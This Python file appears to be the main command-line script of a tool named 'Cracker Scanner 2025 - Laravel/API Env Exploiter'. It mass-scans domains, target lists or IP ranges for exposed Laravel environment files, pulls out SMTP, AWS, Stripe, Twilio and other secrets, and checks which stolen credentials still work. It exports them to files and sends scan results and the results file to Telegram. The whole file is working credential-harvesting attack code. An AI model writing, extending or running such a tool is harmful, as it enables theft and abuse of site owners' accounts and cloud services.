#!/usr/bin/env python3
"""
Cracker Scanner 2025 - Laravel/API Env Exploiter
Main CLI interface for the vulnerability scanner

Usage examples:
    python3 cracker2025.py -t example.com -q
    python3 cracker2025.py -f targets.txt --deep --threads 500
    python3 cracker2025.py -t 192.168.1.0/24 -o results/ --format json,csv
    python3 cracker2025.py --config custom_config.json -t target.com
"""

import argparse
import asyncio
import json
import os
import sys
import time
from typing import Dict, List, Any, Optional

# Add current directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from scanner import LaravelScanner, load_targets_from_file, load_paths_from_file
from extractor import SecretExtractor
from checker import CredentialChecker
from exporter import ResultExporter, create_scan_summary
from telegram import TelegramManager
from core.utils import print_banner, print_status, Colors, generate_cidr_ips
from core.http import is_valid_target

class CrackerScanner2025:
    """Main application class"""
    
    def __init__(self, config_path: str = "config.json"):
        self.config = self.load_config(config_path)
        self.scanner = None
        self.extractor = None
        self.checker = None
        self.exporter = None
        self.telegram = None
        
        # Statistics
        self.stats = {
            'start_time': None,
            'end_time': None,
            'targets_scanned': 0,
            'vulnerabilities_found': 0,
            'secrets_extracted': 0,
            'valid_credentials': 0
        }
    
    def load_config(self, config_path: str) -> Dict[str, Any]:
        """Load configuration from JSON file"""
        try:
            with open(config_path, 'r') as f:
                config = json.load(f)
            print_status(f"Configuration loaded from {config_path}", "success")
            return config
        except FileNotFoundError:
            print_status(f"Config file not found: {config_path}, using defaults", "warning")
            return self.get_default_config()
        except json.JSONDecodeError as e:
            print_status(f"Invalid JSON in config file: {e}", "error")
            return self.get_default_config()
    
    def get_default_config(self) -> Dict[str, Any]:
        """Get default configuration"""
        return {
            'scanner': {
                'timeout': 10,
                'max_retries': 3,
                'max_workers': 100,
                'verify_ssl': False,
                'rate_limit': 10
            },
            'extraction': {'enabled': True},
            'credential_checking': {'enabled': True},
            'output': {
                'directory': 'results',
                'formats': ['json', 'txt']
            },
            'notifications': {
                'telegram': {'enabled': False}
            }
        }
    
    def setup_components(self, args: argparse.Namespace):
        """Initialize scanner components"""
        # Update config with CLI arguments
        if args.timeout:
            self.config['scanner']['timeout'] = args.timeout
        if args.threads:
            self.config['scanner']['max_workers'] = args.threads
        if args.proxy:
            self.config['network'] = self.config.get('network', {})
            self.config['network']['proxy'] = args.proxy
        if args.output:
            self.config['output']['directory'] = args.output
        
        # Initialize components
        self.scanner = LaravelScanner(self.config['scanner'])
        self.extractor = SecretExtractor()
        self.checker = CredentialChecker(timeout=self.config['scanner']['timeout'])
        self.exporter = ResultExporter(self.config['output']['directory'])
        
        # Initialize Telegram if configured
        if self.config.get('notifications', {}).get('telegram', {}).get('enabled'):
            self.telegram = TelegramManager(self.config['notifications']['telegram'])
    
    async def run_scan(self, targets: List[str], args: argparse.Namespace) -> Dict[str, Any]:
        """Execute the main scanning process"""
        self.stats['start_time'] = time.time()
        
        # Load custom paths if specified
        paths = None
        if args.paths_file:
            paths = load_paths_from_file(args.paths_file)
        
        # Initialize Telegram notifications
        if self.telegram:
            await self.telegram.initialize()
            await self.telegram.notify_scan_started(len(targets), len(paths) if paths else 500)
        
        try:
            # Run the scan
            if args.quick:
                print_status("Running quick scan mode", "info")
                vulnerabilities = []
                for target in targets:
                    result = await self.scanner.quick_scan(target)
                    if result.get('vulnerabilities'):
                        vulnerabilities.extend(result['vulnerabilities'])
                        
                        # Send immediate notifications for vulnerabilities
                        if self.telegram:
                            for vuln in result['vulnerabilities']:
                                await self.telegram.notify_vulnerability_found(vuln)
            else:
                print_status("Running comprehensive scan", "info")
                vulnerabilities = await self.scanner.scan_targets(targets, paths)
                
                # Send notifications for vulnerabilities as they're found
                if self.telegram:
                    for vuln in vulnerabilities:
                        await self.telegram.notify_vulnerability_found(vuln)
            
            self.stats['targets_scanned'] = len(targets)
            self.stats['vulnerabilities_found'] = len(vulnerabilities)
            
            # Extract secrets from vulnerabilities
            all_secrets = {}
            if vulnerabilities and self.config.get('extraction', {}).get('enabled', True):
                print_status("Extracting secrets from found vulnerabilities", "info")
                
                for vuln in vulnerabilities:
                    if vuln.get('extracted_data', {}).get('secrets'):
                        secrets = vuln['extracted_data']['secrets']
                        for secret_type, items in secrets.items():
                            if secret_type not in all_secrets:
                                all_secrets[secret_type] = []
                            all_secrets[secret_type].extend(items)
                
                # Remove duplicates
                for secret_type in all_secrets:
                    all_secrets[secret_type] = list(set(all_secrets[secret_type]))
                
                self.stats['secrets_extracted'] = sum(len(items) for items in all_secrets.values())
                print_status(f"Extracted {self.stats['secrets_extracted']} secrets total", "success")
            
            # Check credentials if enabled
            valid_credentials = {}
            if all_secrets and self.config.get('credential_checking', {}).get('enabled', True) and not args.no_check:
                print_status("Testing extracted credentials", "info")
                
                # Convert extracted secrets to credential format
                credentials_to_check = self._prepare_credentials_for_checking(all_secrets)
                
                if credentials_to_check:
                    valid_credentials = await self.checker.check_all_credentials(credentials_to_check)
                    valid_count = sum(len(creds) for creds in self.checker.get_valid_credentials().values())
                    self.stats['valid_credentials'] = valid_count
                    
                    if valid_count > 0:
                        print_status(f"Found {valid_count} valid credentials!", "success")
            
            self.stats['end_time'] = time.time()
            
            # Create comprehensive results
            results = {
                'scan_info': {
                    'timestamp': time.time(),
                    'targets': targets,
                    'scan_type': 'quick' if args.quick else 'comprehensive',
                    'duration': self.stats['end_time'] - self.stats['start_time']
                },
                'summary': create_scan_summary(
                    vulnerabilities,
                    self.checker.get_valid_credentials() if hasattr(self.checker, 'get_valid_credentials') else {},
                    self.stats['end_time'] - self.stats['start_time'],
                    len(targets)
                ),
                'vulnerabilities': vulnerabilities,
                'extracted_secrets': all_secrets,
                'valid_credentials': self.checker.get_valid_credentials() if hasattr(self.checker, 'get_valid_credentials') else {},
                'statistics': self.stats
            }
            
            # Send completion notification
            if self.telegram:
                await self.telegram.notify_scan_complete(
                    results['summary'],
                    results['valid_credentials']
                )
            
            return results
            
        except Exception as e:
            print_status(f"Scan failed: {str(e)}", "error")
            if self.telegram:
                await self.telegram.notify_error(str(e), "Main scan process")
            raise
    
    def _prepare_credentials_for_checking(self, secrets: Dict[str, List]) -> Dict[str, List[Dict]]:
        """Convert extracted secrets to format suitable for credential checking"""
        credentials = {}
        
        # SMTP credentials
        if 'smtp' in secrets and secrets['smtp']:
            smtp_creds = []
            # Group SMTP credentials by host if possible
            # For now, create basic credential dict
            for i in range(0, len(secrets['smtp']), 4):  # Assume 4 pieces per SMTP config
                if i + 3 < len(secrets['smtp']):
                    smtp_creds.append({
                        'host': secrets['smtp'][i],
                        'port': secrets['smtp'][i+1] if len(secrets['smtp']) > i+1 else '587',
                        'username': secrets['smtp'][i+2] if len(secrets['smtp']) > i+2 else '',
                        'password': secrets['smtp'][i+3] if len(secrets['smtp']) > i+3 else ''
                    })
            if smtp_creds:
                credentials['smtp'] = smtp_creds
        
        # AWS credentials
        if 'aws' in secrets and secrets['aws']:
            aws_creds = []
            for i in range(0, len(secrets['aws']), 2):
                if i + 1 < len(secrets['aws']):
                    aws_creds.append({
                        'access_key_id': secrets['aws'][i],
                        'secret_access_key': secrets['aws'][i+1],
                        'region': 'us-east-1'  # Default region
                    })
            if aws_creds:
                credentials['aws'] = aws_creds
        
        # API keys
        for service in ['sendgrid', 'mailgun', 'twilio', 'stripe']:
            if service in secrets and secrets[service]:
                credentials[service] = [{'api_key': key} for key in secrets[service]]
        
        return credentials
    
    def export_results(self, results: Dict[str, Any], args: argparse.Namespace) -> Dict[str, str]:
        """Export scan results in requested formats"""
        print_status("Exporting scan results", "info")
        
        # Determine export formats
        if args.format:
            formats = [f.strip().lower() for f in args.format.split(',')]
        else:
            formats = self.config.get('output', {}).get('formats', ['json', 'txt'])
        
        # Generate base filename
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        base_filename = f"cracker_scan_{timestamp}"
        
        export_results = {}
        
        # Export each requested format
        if 'json' in formats:
            export_results['json'] = self.exporter.export_json(results, f"{base_filename}.json")
        
        if 'txt' in formats:
            export_results['txt'] = self.exporter.export_txt(results, f"{base_filename}.txt")
        
        if 'csv' in formats and results.get('vulnerabilities'):
            export_results['csv'] = self.exporter.export_csv(
                results['vulnerabilities'], 
                f"{base_filename}_vulnerabilities.csv"
            )
        
        if 'xml' in formats:
            export_results['xml'] = self.exporter.export_xml(results, f"{base_filename}.xml")
        
        # Export secrets separately if requested
        if args.secrets_only and results.get('extracted_secrets'):
            export_results['secrets'] = self.exporter.export_secrets_only(
                results['extracted_secrets'],
                f"{base_filename}_secrets.json"
            )
        
        return export_results
    
    def print_summary(self, results: Dict[str, Any]):
        """Print scan summary to console"""
        print("\n" + "="*80)
        print(f"{Colors.BOLD}{Colors.CYAN}SCAN SUMMARY{Colors.END}")
        print("="*80)
        
        summary = results.get('summary', {})
        
        print(f"{Colors.GREEN}Targets scanned:{Colors.END} {summary.get('total_targets', 0)}")
        print(f"{Colors.YELLOW}Vulnerabilities found:{Colors.END} {summary.get('total_vulnerabilities', 0)}")
        print(f"{Colors.PURPLE}Secrets extracted:{Colors.END} {summary.get('total_secrets', 0)}")
        print(f"{Colors.BLUE}Valid credentials:{Colors.END} {summary.get('total_valid_credentials', 0)}")
        print(f"{Colors.WHITE}Duration:{Colors.END} {summary.get('duration', 0):.2f} seconds")
        
        # Vulnerability breakdown
        if summary.get('vulnerability_types'):
            print(f"\n{Colors.BOLD}Vulnerability Types:{Colors.END}")
            for vuln_type, count in summary['vulnerability_types'].items():
                print(f"  • {vuln_type}: {count}")
        
        # Valid credentials breakdown
        valid_creds = summary.get('valid_credentials_by_service', {})
        if any(valid_creds.values()):
            print(f"\n{Colors.BOLD}Valid Credentials by Service:{Colors.END}")
            for service, count in valid_creds.items():
                if count > 0:
                    print(f"  • {service.upper()}: {count}")
        
        print("="*80)

def parse_arguments() -> argparse.Namespace:
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="Cracker Scanner 2025 - Laravel/API Env Exploiter",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Quick scan single target:
    python3 cracker2025.py -t example.com -q
    
  Deep scan with custom threads:
    python3 cracker2025.py -t example.com --deep --threads 500
    
  Scan multiple targets from file:
    python3 cracker2025.py -f targets.txt --threads 200
    
  Scan CIDR range:
    python3 cracker2025.py -t 192.168.1.0/24 --quick
    
  Custom output and format:
    python3 cracker2025.py -t example.com -o results/ --format json,csv,txt
    
  With proxy and Telegram notifications:
    python3 cracker2025.py -t example.com --proxy socks5://127.0.0.1:9050
    
  Custom paths file:
    python3 cracker2025.py -t example.com --paths custom_paths.txt
        """
    )
    
    # Target specification
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument('-t', '--target', 
                             help='Single target (IP, domain, URL, or CIDR)')
    target_group.add_argument('-f', '--file', dest='targets_file',
                             help='File containing targets (one per line)')
    
    # Scan modes
    scan_group = parser.add_mutually_exclusive_group()
    scan_group.add_argument('-q', '--quick', action='store_true',
                           help='Quick scan with high-priority paths only')
    scan_group.add_argument('--deep', action='store_true',
                           help='Deep scan with all available paths (default)')
    
    # Performance options
    parser.add_argument('--threads', type=int, default=100,
                       help='Number of concurrent threads (default: 100, max: 10000)')
    parser.add_argument('--timeout', type=int, default=10,
                       help='Request timeout in seconds (default: 10)')
    parser.add_argument('--rate-limit', type=int, default=10,
                       help='Requests per second per target (default: 10)')
    
    # Network options
    parser.add_argument('--proxy', 
                       help='Proxy URL (http://proxy:port or socks5://proxy:port)')
    parser.add_argument('--no-ssl-verify', action='store_true',
                       help='Disable SSL certificate verification')
    parser.add_argument('--user-agent',
                       help='Custom User-Agent string')
    
    # Input/Output options
    parser.add_argument('-o', '--output', default='results',
                       help='Output directory (default: results)')
    parser.add_argument('--format', default='json,txt',
                       help='Output formats: json,csv,txt,xml (default: json,txt)')
    parser.add_argument('--no-export', action='store_true',
                       help='Skip exporting results to files')
    parser.add_argument('--secrets-only', action='store_true',
                       help='Export only extracted secrets')
    
    # Feature toggles
    parser.add_argument('--no-extract', action='store_true',
                       help='Skip secret extraction')
    parser.add_argument('--no-check', action='store_true',
                       help='Skip credential validation')
    parser.add_argument('--no-telegram', action='store_true',
                       help='Disable Telegram notifications')
    
    # Configuration
    parser.add_argument('--config', default='config.json',
                       help='Configuration file path (default: config.json)')
    parser.add_argument('--paths', dest='paths_file',
                       help='Custom paths file to scan')
    
    # Misc options
    parser.add_argument('--verbose', '-v', action='store_true',
                       help='Verbose output')
    parser.add_argument('--version', action='version', version='Cracker Scanner 2025 v1.0')
    
    return parser.parse_args()

async def main():
    """Main entry point"""
    # Parse arguments
    args = parse_arguments()
    
    # Print banner
    print_banner()
    
    # Validate thread count
    if args.threads > 10000:
        print_status("Maximum thread count is 10,000. Using 10,000.", "warning")
        args.threads = 10000
    
    # Initialize scanner
    try:
        scanner_app = CrackerScanner2025(args.config)
        scanner_app.setup_components(args)
    except Exception as e:
        print_status(f"Failed to initialize scanner: {str(e)}", "error")
        return 1
    
    # Prepare targets
    targets = []
    if args.target:
        # Handle single target or CIDR
        if '/' in args.target and any(c.isdigit() for c in args.target.split('/')[1]):
            # CIDR notation
            cidr_targets = generate_cidr_ips(args.target)
            targets.extend(cidr_targets[:1000])  # Limit CIDR expansion
            print_status(f"Expanded CIDR {args.target} to {len(targets)} targets", "info")
        else:
            targets.append(args.target)
    elif args.targets_file:
        targets = load_targets_from_file(args.targets_file)
        if not targets:
            print_status(f"No valid targets found in {args.targets_file}", "error")
            return 1
    
    # Validate targets
    valid_targets = []
    for target in targets:
        if is_valid_target(target):
            valid_targets.append(target)
        else:
            print_status(f"Invalid target: {target}", "warning")
    
    if not valid_targets:
        print_status("No valid targets to scan", "error")
        return 1
    
    print_status(f"Starting scan of {len(valid_targets)} targets", "info")
    
    # Run the scan
    try:
        results = await scanner_app.run_scan(valid_targets, args)
        
        # Export results
        if not args.no_export:
            export_results = scanner_app.export_results(results, args)
            
            print_status("Export completed:", "success")
            for format_type, filepath in export_results.items():
                if filepath:
                    print_status(f"  {format_type.upper()}: {filepath}", "info")
            
            # Send results via Telegram if configured
            if scanner_app.telegram and export_results.get('json'):
                await scanner_app.telegram.send_results_file(
                    export_results['json'], 'json'
                )
        
        # Print summary
        scanner_app.print_summary(results)
        
        # Exit with appropriate code
        vulnerabilities = len(results.get('vulnerabilities', []))
        if vulnerabilities > 0:
            print_status(f"Scan completed: {vulnerabilities} vulnerabilities found", "found")
            return 0  # Success with findings
        else:
            print_status("Scan completed: No vulnerabilities found", "success")
            return 0  # Success, no findings
        
    except KeyboardInterrupt:
        print_status("\nScan interrupted by user", "warning")
        return 2
    except Exception as e:
        print_status(f"Scan failed: {str(e)}", "error")
        if args.verbose:
            import traceback
            traceback.print_exc()
        return 1

if __name__ == "__main__":
    # Ensure we can run async code
    try:
        exit_code = asyncio.run(main())
        sys.exit(exit_code)
    except KeyboardInterrupt:
        print_status("\nExiting...", "info")
        sys.exit(2)